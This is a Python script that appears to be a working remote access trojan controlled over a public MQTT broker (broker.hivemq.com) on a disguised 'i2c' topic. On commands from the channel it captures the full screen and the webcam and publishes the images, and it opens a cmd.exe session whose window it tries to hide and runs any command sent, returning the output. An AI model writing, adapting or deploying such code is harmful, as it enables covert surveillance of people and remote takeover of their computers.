import uuid

import cv2
import paho.mqtt.client as mqtt
import base64
from io import BytesIO
from PIL import Image
import mss
import subprocess
import threading
import time

broker = "broker.hivemq.com"
topic = "anonymous/i2c/bus"

mac = uuid.getnode()
device_id = f"{mac:012x}"[-5:].upper()
reserved = False

class CmdSessionManager:
    def __init__(self):
        self.process = None
        self.thread = None
        self.output = ""
        self.lock = threading.Lock()

    def new_cmd_session(self):
        self.close_session()

        # Hide the cmd window
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        self.process = subprocess.Popen(
            ["cmd.exe"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            startupinfo=startupinfo
        )

        def read_output():
            for line in self.process.stdout:
                with self.lock:
                    self.output += line
                print(line, end='')

        self.output = ""
        self.thread = threading.Thread(target=read_output, daemon=True)
        self.thread.start()
        time.sleep(0.1)

    def run_command_in_session(self, command):
        if self.process is None:
            raise RuntimeError("No active session. Call new_cmd_session first.")

        if isinstance(command, list):
            command = ' '.join(command)

        with self.lock:
            self.output = ""

        self.process.stdin.write(command + "\n")
        self.process.stdin.flush()
        time.sleep(0.5)

        with self.lock:
            return self.output.strip()

    def close_session(self):
        if self.process:
            try:
                self.process.stdin.write("exit\n")
                self.process.stdin.flush()
                self.process.wait(timeout=2)
            except Exception:
                self.process.kill()
            self.process = None
            self.thread = None
            self.output = ""

cmd_manager = CmdSessionManager()

def screenshot_to_base64(format='JPEG', quality=85):
    with mss.mss() as sct:
        screenshot = sct.grab(sct.monitors[0])  # Full screen
        img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)

        # Save to memory
        buffer = BytesIO()
        img.save(buffer, format=format, quality=quality)
        buffer.seek(0)

        # Encode to Base64
        b64_bytes = base64.b64encode(buffer.read())
        return b64_bytes.decode('utf-8')

def webcam_to_base64(format='JPEG', quality=85, camera_index=0):
    # Capture image from webcam
    cap = cv2.VideoCapture(camera_index)
    ret, frame = cap.read()
    cap.release()

    if not ret:
        raise RuntimeError("Failed to capture image from webcam")

    # Convert from BGR (OpenCV) to RGB (PIL)
    rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    img = Image.fromarray(rgb_frame)

    # Save to memory
    buffer = BytesIO()
    img.save(buffer, format=format, quality=quality)
    buffer.seek(0)

    # Encode to Base64
    b64_bytes = base64.b64encode(buffer.read())
    return b64_bytes.decode('utf-8')

def on_connect(client, userdata, flags, rc, properties=None):
    print("CONNECTED TO BROKER")
    client.subscribe(topic)

def on_message(client, userdata, message):
    global reserved  # Needed to modify the global variable

    text = message.payload.decode("utf-8").strip()
    print("SERVER CHAT:", text)

    if "WHO" in text:
        client.publish(topic, f"{device_id} - {reserved}")

    if "RES" in text:
        target = text.removeprefix("RES ").strip()
        if target == device_id and not reserved:
            reserved = True
            client.publish(topic, f"{device_id} RESERVED")
        elif target == device_id and reserved:
            client.publish(topic, f"{device_id} ALREADY RESERVED")

    if "REL" in text:
        target = text.removeprefix("REL ").strip()
        if target == device_id and reserved:
            reserved = False
            cmd_manager.close_session()
            client.publish(topic, f"{device_id} CANCELED")
        elif target == device_id and not reserved:
            client.publish(topic, f"{device_id} ALREADY CANCELED")

    if "GET" in text:
        parts = text.removeprefix("GET ").strip().split()
        action = parts[0]
        target = parts[1]
        if target == device_id and action == "SC" and reserved:
            try:
                b64_str = screenshot_to_base64(format='WEBP', quality=50)
                b64_size_kb = len(b64_str.encode('utf-8')) / 1024
                print(str(b64_size_kb) + "Kb")
                client.publish(topic, f"{device_id} {b64_str}")
            except:
                client.publish(topic, f"{device_id} ERROR")
        elif target == device_id and action == "CC" and reserved:
            try:
                b64_str = webcam_to_base64(format='WEBP', quality=50)
                b64_size_kb = len(b64_str.encode('utf-8')) / 1024
                print(str(b64_size_kb) + "Kb")
                client.publish(topic, f"{device_id} {b64_str}")
            except:
                client.publish(topic, f"{device_id} ERROR")
        elif not reserved:
            client.publish(topic, f"{device_id} NOT RESERVED")

    if "NCL" in text:
        target = text.removeprefix("NCL ").strip()
        if target == device_id and reserved:
            cmd_manager.new_cmd_session()

    if "CMD" in text:
        parts = text.removeprefix("CMD ").strip().split()
        action = parts[1:len(parts)]
        target = parts[0]
        if target == device_id and reserved:
            client.publish(topic, cmd_manager.run_command_in_session(action))

client = mqtt.Client(
    client_id="",
    protocol=mqtt.MQTTv5
)

client.on_connect = on_connect
client.on_message = on_message

client.connect(broker, 1883, 60)
client.loop_forever()
